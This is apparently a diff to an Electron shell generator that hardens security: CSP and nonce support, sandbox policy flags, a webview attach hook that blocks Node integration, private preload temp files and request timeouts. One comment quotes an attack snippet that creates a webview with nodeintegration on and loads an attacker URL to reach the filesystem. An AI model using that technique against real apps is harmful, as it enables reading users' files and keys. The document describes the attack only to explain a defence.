@@ -13,6 +13,7 @@ import {
   mountLine,
   RENDERER_TAG,
 } from "./electron-renderer-log.ts";
+import { upstreamNoiseMatcherSource } from "../diagnostics/upstream-noise.ts";
 
 export type Log = { info: (msg: string) => void; error: (msg: string) => void };
 
@@ -48,6 +49,16 @@ export type ShellConfig = {
   /** ui.dir — `<html dir>`, the RTL half of `lang`. Same story: declared on
    *  the server's own options type and dropped by every generator. */
   dir?: import("../server/aio-types.ts").UiConfig["dir"];
+  /** The app's Content-Security-Policy, emitted into the shell as a
+   *  `<meta http-equiv>`. Required here because the packaged window returns
+   *  its HTML from the main process, never through the HTTP handler that
+   *  attaches the policy as a header — so without this a packaged app has NO
+   *  policy while its config says otherwise. See `headContent`'s `csp`. */
+  csp?: string;
+  /** Nonce for the shell's own inline module script, so a policy carrying
+   *  `script-src 'self' 'nonce-…'` does not block the boot script it ships
+   *  with. One per launch: the packaged HTML is templated once. */
+  nonce?: string;
 };
 
 /** Window metadata extracted from config or HTML meta tags */
@@ -57,6 +68,15 @@ export type AioMeta = {
   height?: number;
   /** Allow openWindow child windows (off by default — see AioRunOptions). */
   childWindows?: boolean;
+  /** `electron: { requireSandbox }` — refuse to launch at all rather than fall
+   *  back to `--no-sandbox` on a host where Chromium's sandbox is unusable.
+   *  See ElectronConfig. */
+  requireSandbox?: boolean;
+  /** `electron: { unsandboxedChildWindows }` — may a renderer's
+   *  `openWindow(url, { sandbox: false })` be HONOURED? Off by default: the
+   *  Chromium sandbox of a window this app opens is the app's decision, never
+   *  the page's. See ElectronConfig. */
+  unsandboxedChildWindows?: boolean;
   /** `ui.chrome` — how much of the window the OS draws. See UiConfig. */
   chrome?: "standard" | "themed" | "none";
   /** `ui.tray` — a system tray icon, menu and close-to-tray. See UiConfig. */
@@ -66,6 +86,24 @@ export type AioMeta = {
    *  is what a default-home app has always had. */
   profileName?: string;
 };
+
+/** The app's `electron: { … }` block, as the window meta that carries it.
+ *
+ *  ONE copy of this mapping, and a total one — `tests/electron-sandbox-policy.
+ *  test.ts` checks it against `VALID_ELECTRON_KEYS`, so a key added to the
+ *  config and forgotten here is red rather than a permanently `undefined`
+ *  security switch. That is the config-bridge bug class this repo has now paid
+ *  for six times (`strictOrigin`, `redactActions`, `appDir`, `renderBudget`,
+ *  `serveDirs`, `_cellNames`), and a SECURITY key silently lost is the worst
+ *  version of it: the app believes it is protected. */
+export function electronMetaPolicy(
+  cfg: import("../server/aio-types.ts").ElectronConfig | undefined,
+): Pick<AioMeta, "requireSandbox" | "unsandboxedChildWindows"> {
+  return {
+    requireSandbox: !!cfg?.requireSandbox,
+    unsandboxedChildWindows: !!cfg?.unsandboxedChildWindows,
+  };
+}
 
 /** Slugifies a title for use as Electron app name (stable userData path).
  *  THE transform, from `single-instance-lock.ts`: the userData path and the
@@ -418,6 +456,66 @@ ${
     } catch {}
     return { action: 'deny' };
   });
+  // 🔒 A GUEST MAY NOT ASK FOR NODE. Electron's own security checklist names
+  // this hook, and it was missing: with webviewTag enabled (childWindows),
+  // any script in the renderer could
+  //
+  //     const w = document.createElement('webview');
+  //     w.setAttribute('nodeintegration', 'on');
+  //     w.src = 'https://attacker/';
+  //
+  // and reach require('fs') in the guest process — i.e. read any file the
+  // user can, past every gate the app has. Reported by a crypto wallet built on aio,
+  // where that file is the key vault: the app's own <webview> usage is
+  // careful, but an app can only choose the attributes of the element IT
+  // creates, never of one an attacker creates.
+  //
+  // will-attach-webview is the only place this can be refused, because it
+  // fires BEFORE the guest's process is spawned — did-attach-webview below
+  // is already too late to change its preferences.
+  //
+  // A preload is allowed only from inside the app directory, resolved with
+  // realpath so a symlink cannot point out of it. Everything else about the
+  // guest is forced, not merely defaulted: an app that genuinely needs a
+  // privileged guest should open a window, where the request is explicit.
+  win.webContents.on('will-attach-webview', (_ev, webPreferences, params) => {
+    webPreferences.nodeIntegration = false;
+    webPreferences.nodeIntegrationInSubFrames = false;
+    webPreferences.contextIsolation = true;
+    webPreferences.webSecurity = true;
+    delete webPreferences.preloadURL;
+    let ok = false;
+    try {
+      const want = params.preload || webPreferences.preload;
+      if (want) {
+        // No regex on purpose. A /^file:\\/\\// literal here emits
+        // /^file:/// into the generated script, where the trailing // is a
+        // LINE COMMENT that swallows the closing paren — a syntax error in a
+        // file no type-checker reads, i.e. a window that never opens. Caught
+        // by the parse test; kept as prose so it is not reintroduced.
+        const wantPath = want.startsWith('file://') ? want.slice(7) : want;
+        const real = fs.realpathSync(wantPath);
+        // The same root the openWindow handler uses. typeof guarded because
+        // this template is shared with the WebSocket window, whose generated
+        // script does not declare BASE_DIR — and a throw here would be a
+        // refusal anyway, which is the right direction to fail.
+        const root = fs.realpathSync(
+          (typeof BASE_DIR === 'string' && BASE_DIR) || process.cwd(),
+        );
+        ok = real === root || real.startsWith(root + path.sep);
+        if (ok) webPreferences.preload = real;
+      }
+    } catch {}
+    if (!ok) {
+      delete webPreferences.preload;
+      delete params.preload;
+    }
+    // The page cannot re-request Node through the attributes either.
+    params.nodeintegration = 'off';
+    params.nodeintegrationinsubframes = 'off';
+    params.disablewebsecurity = 'off';
+    params.allowpopups = 'off';
+  });
   // Local hotfix: <webview> GUESTS need the same popup policy — the guest's
   // 'new-window' DOM event was removed in Electron 22, so a renderer-side
   // listener never fires and a target=_blank inside an embedded page did
@@ -625,6 +723,18 @@ export function tmplSocketFetch(): string {
 const AIO_MAX_SOCKETS = 6;
 // The body sizes worth taking in one piece here rather than streaming.
 const AIO_SMALL_BODY = 64 * 1024;
+// How long a request may go without the app answering AT ALL. The agent caps
+// this app at AIO_MAX_SOCKETS, so that cap is also a queue: six requests with
+// no bound hold six sockets forever and every later request in the window
+// waits behind them, permanently. Bounded to the FIRST byte of the response
+// only — a long-lived stream (SSE, a large download) is never touched once
+// its headers are here.
+const AIO_REQ_TIMEOUT_MS = (() => {
+  const raw = typeof process !== 'undefined' && process.env
+    ? Number(process.env.AIO_SOCKET_TIMEOUT_MS)
+    : NaN;
+  return Number.isFinite(raw) && raw > 0 ? raw : 30000;
+})();
 const __aioAgents = new Map();
 function __aioAgent(mod, key) {
   let a = __aioAgents.get(key);
@@ -632,8 +742,18 @@ function __aioAgent(mod, key) {
   return a;
 }
 function socketFetch(reqPath, method, headers, body) {
-  return new Promise((resolve) => {
+  return new Promise((resolveRaw) => {
     const { Readable } = require('stream');
+    // ONE settle for every exit — the response, the error, the timeout — so
+    // the deadline below is always disarmed and no path can resolve twice.
+    let __aioSettled = false;
+    let __aioDeadline;
+    const resolve = (r) => {
+      if (__aioSettled) return;
+      __aioSettled = true;
+      clearTimeout(__aioDeadline);
+      resolveRaw(r);
+    };
     // The socket when this app has one; otherwise the HTTP server (forced
     // aio:// in dev). A self-signed --expose cert is this app's own — the
     // http:// branch trusts it the way certificate-error does below.
@@ -714,16 +834,100 @@ function socketFetch(reqPath, method, headers, body) {
         }), { status, headers: h }));
       },
     );
+    const __aioWhere = HTTP_SOCK ? 'socket (' + HTTP_SOCK + ')' : 'HTTP server (' + HTTP_URL + ')';
     // A dead socket must not hang the window forever on a blank page. Say what
     // failed, in the window, where the developer is already looking.
     r.on('error', (e) => resolve(new Response(
-      'aio: cannot reach the app over its ' + (HTTP_SOCK ? 'socket (' + HTTP_SOCK + ')' : 'HTTP server (' + HTTP_URL + ')') + ': ' + e.message,
+      'aio: cannot reach the app over its ' + __aioWhere + ': ' + e.message,
       { status: 502, headers: { 'Content-Type': 'text/plain' } },
     )));
+    // A peer that ACCEPTS and never answers is not an error — nothing fails,
+    // nothing closes, and without this the promise never settles and the
+    // socket is never given back. Six of those and the window is finished.
+    // Loud on both sides: a 504 the developer sees in the window, and a line
+    // in the main process's log, which is where an agent or an operator
+    // looks. Destroying the request is what frees the socket for the queue.
+    __aioDeadline = setTimeout(() => {
+      const msg = 'aio: no answer from the app for ' + (method || 'GET') + ' ' +
+        reqPath + ' after ' + AIO_REQ_TIMEOUT_MS + ' ms over its ' + __aioWhere +
+        '. The request was dropped so the window keeps working; if this route is ' +
+        'legitimately that slow to its FIRST byte, raise AIO_SOCKET_TIMEOUT_MS.';
+      // aio-ok: the 504 below is the real answer; a main process whose
+      // console is gone must not turn a timeout into an unhandled throw.
+      try { console.error(msg); } catch {}
+      resolve(new Response(msg, { status: 504, headers: { 'Content-Type': 'text/plain' } }));
+      // After the resolve: destroy() fires 'error', which the handler above
+      // now finds already settled.
+      // aio-ok: the caller already has its 504. destroy() is housekeeping
+      // to give the socket back, and a socket already gone needs none.
+      try { r.destroy(new Error('aio: request timed out after ' + AIO_REQ_TIMEOUT_MS + ' ms')); } catch {}
+    }, AIO_REQ_TIMEOUT_MS);
     if (body && typeof body.getReader === 'function') Readable.fromWeb(body).pipe(r);
     else { if (body) r.write(body); r.end(); }
   });
 }`;
+}
+
+/** Where a generated shell WRITES its preload — the one file in a launch that
+ *  is code the renderer will run.
+ *
+ *  Both shells wrote `<temp>/__aio_preload_<pid>.cjs` with no mode: a name
+ *  anyone on the box can work out in advance, at the process umask (0644 on a
+ *  default install), in a directory every user shares. The main script beside
+ *  it has always been `Deno.makeTempFile()` — random name, 0600 — so this was
+ *  the odd one out rather than a policy (an audit, §8).
+ *
+ *  A private directory, not just a mode: `mode:` is the mode a file is CREATED
+ *  with and is ignored for one that already exists, which is exactly the case a
+ *  predictable name invites. `mkdtempSync` makes the directory 0700 with a name
+ *  nobody could have waited for, and the file inside it is 0600.
+ *
+ *  The markers are load-bearing: `tests/electron-preload-file.test.ts` cuts
+ *  this block out of the generated script and RUNS it against real `node:fs`,
+ *  so the mode is asserted on a file rather than on the text that was meant to
+ *  produce one. Emits `preloadDir` and `preloadFile`; expects `fs`, `path` and
+ *  `app` in scope, and `code` is the expression holding the preload source.
+ *  Sweep it with {@linkcode tmplPreloadCleanup}. */
+export function tmplPreloadWrite(code: string): string {
+  return `// …swept on the way out, whichever way out this is. \`window-all-closed\` is
+// one of them and not the common one: aio's own shutdown kills this process
+// (shutdown.ts, phase "electron" — \`ep.kill()\`, i.e. SIGTERM), so every
+// Ctrl-C'd \`deno task dev\`, every dev restart and every test that stops an
+// app used to leave one private directory per launch behind in <temp>.
+// The signal handlers RE-RAISE after sweeping, so the exit status this
+// process reports is the one it would have had (electronClosedPlan reads it).
+//
+// ARMED BEFORE THE DIRECTORY EXISTS, which is the whole reason this sits
+// above the block instead of below it. Creating first and arming second
+// leaves a window — short, and wide open on a loaded machine — in which a
+// SIGTERM takes the default action and the directory it names outlives the
+// process. That is not a theory: it is how the suite caught this, under load,
+// after the sweep itself had already shipped. \`preloadDir\` is referenced
+// before its declaration on purpose: a sweep that runs in that window throws
+// on the temporal dead zone and the catch turns it into the no-op it is —
+// there is nothing on disk to remove yet.
+const __aioSweepPreload = () => { try { fs.rmSync(preloadDir, { recursive: true, force: true }); } catch {} };
+process.on('exit', __aioSweepPreload);
+for (const __aioSig of ['SIGTERM', 'SIGINT', 'SIGHUP']) {
+  try {
+    process.on(__aioSig, () => {
+      __aioSweepPreload();
+      process.removeAllListeners(__aioSig);
+      try { process.kill(process.pid, __aioSig); } catch { process.exit(0); }
+    });
+  } catch {}
+}
+// ── aio preload file — a private 0700 dir, the file 0600 ──
+const preloadDir = fs.mkdtempSync(path.join(app.getPath('temp'), 'aio-preload-'));
+const preloadFile = path.join(preloadDir, 'preload.cjs');
+fs.writeFileSync(preloadFile, ${code}, { mode: 0o600 });
+// ── end aio preload file ──`;
+}
+
+/** Removes the preload directory {@linkcode tmplPreloadWrite} made. The file
+ *  alone would leave an empty directory per launch behind in `<temp>`. */
+export function tmplPreloadCleanup(): string {
+  return `__aioSweepPreload();`;
 }
 
 /** Generates preload script CJS code (contextBridge IPC + AIO-54 navigate relay) */
@@ -826,6 +1030,7 @@ export function udsPreloadDiagnostics(): string {
 export function tmplRendererDiagnostics(hasMountSignal: boolean): string {
   // The encoder half of `classifyElectronLine` — same tag, same fold.
   return `
+  const _aioUpstreamNoise = ${upstreamNoiseMatcherSource()};
   const _rlog = (level, msg) => {
     try { process.stderr.write(${JSON.stringify(RENDERER_TAG)} + level + '] ' +
       String(msg).replace(/\\r?\\n/g, ' \u23ce ') + '\\n'); } catch {}
@@ -841,6 +1046,13 @@ export function tmplRendererDiagnostics(hasMountSignal: boolean): string {
     if (e && typeof e.level === 'string') { lv = e.level; msg = e.message; ln = e.lineNumber; src = e.sourceId; }
     else { lv = ['debug', 'info', 'warning', 'error'][a[0]] || 'info'; msg = a[1]; ln = a[2]; src = a[3]; }
     if (lv !== 'error' && lv !== 'warning') return;
+    // An error the RUNTIME threw, not the app: named, annotated, and logged
+    // at info so it never reaches errors=N or a red overlay badge. It is
+    // not dropped — a permanently lit error indicator and a swallowed line
+    // are the same failure from opposite sides. The matcher is generated from
+    // ONE list (diagnostics/upstream-noise.ts) rather than copied here.
+    const _known = _aioUpstreamNoise(msg, src);
+    if (_known) { _rlog('info', _known + (src ? ' (' + src + ':' + ln + ')' : '')); return; }
     _rlog(lv === 'error' ? 'error' : 'warn', String(msg) + (src ? ' (' + src + ':' + ln + ')' : ''));
   });
   win.webContents.on('render-process-gone', (_e, d) => {
@@ -928,6 +1140,8 @@ export function udsProdHTML(
     lang: shell?.lang,
     layout: shell?.layout,
     dir: shell?.dir,
+    csp: shell?.csp,
+    nonce: shell?.nonce,
   });
 }
 
